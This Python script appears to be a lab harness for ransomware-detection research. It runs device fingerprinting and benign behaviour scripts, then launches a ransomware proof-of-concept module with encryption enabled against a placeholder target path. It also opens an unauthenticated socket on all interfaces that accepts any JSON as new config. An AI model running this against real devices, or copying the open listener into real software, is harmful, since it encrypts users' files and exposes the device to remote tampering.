from os import path, remove
from json import loads
from multiprocessing import Process
from socket import AF_INET, SOCK_STREAM, socket
from subprocess import call
from time import sleep
from argparse import ArgumentParser

from globals import get_config_path, update_existing_config
from rwpoc import run

TARGET_PATH = "<start-path-on-target-device>"


def parse_args():
    parser = ArgumentParser(description='Electrosense Sensor')
    parser.add_argument("-b", "--behaviors",
                        nargs="*",
                        choices=["normal", "compression", "installation", "preprocessing"],
                        help="Additional benign behavior executed.",
                        default="normal",
                        action="store")
    return parser.parse_args()


def execute_compression_behavior():
    call("./benign_behaviors/compression.sh")


def execute_installation_behavior():
    call("./benign_behaviors/installation.sh")


def execute_preprocessing_behavior():
    call("./benign_behaviors/preprocessing.sh")


def listen_for_config_changes():
    with socket(AF_INET, SOCK_STREAM) as sock:
        sock.bind(("0.0.0.0", 42666))
        sock.listen(1)

        while True:
            conn, addr = sock.accept()  # keep listening for new connections
            with conn:
                while True:
                    data = conn.recv(1024)  # listen for incoming data of connection
                    if not data:
                        break
                    new_config = loads(data.decode(encoding="utf-8"))
                    print("received", new_config)
                    update_existing_config(new_config)


def collect_device_fingerprint():
    call("./fingerprinter.sh")  # without option "-n <limit>", this will continuously collect FP


def kill_process(proc):
    print("kill Process", proc)
    proc.terminate()
    proc.join()
    print("killed Process", proc)


if __name__ == "__main__":
    config_path = get_config_path()
    if path.exists(config_path):
        remove(config_path)

    procs = []
    proc_config = Process(target=listen_for_config_changes)
    procs.append(proc_config)
    proc_config.start()

    proc_fp = Process(target=collect_device_fingerprint)
    procs.append(proc_fp)
    proc_fp.start()

    args = parse_args()
    behaviors = args.behaviors

    def start_behavior_process(target):
        behavior_process = Process(target=target)
        procs.append(behavior_process)
        behavior_process.start()

    if "compression" in behaviors:
        start_behavior_process(execute_compression_behavior)
    if "installation" in behaviors:
        start_behavior_process(execute_installation_behavior)
    if "preprocessing" in behaviors:
        start_behavior_process(execute_preprocessing_behavior)

    print("Waiting for initial config...")
    while not path.exists(config_path):
        sleep(1)

    try:
        run(encrypt=True, absolute_paths=TARGET_PATH)
    finally:
        print("finally")
        for proc in procs:
            if proc.is_alive():
                kill_process(proc)
            else:
                print("Process", proc, "already dead.")
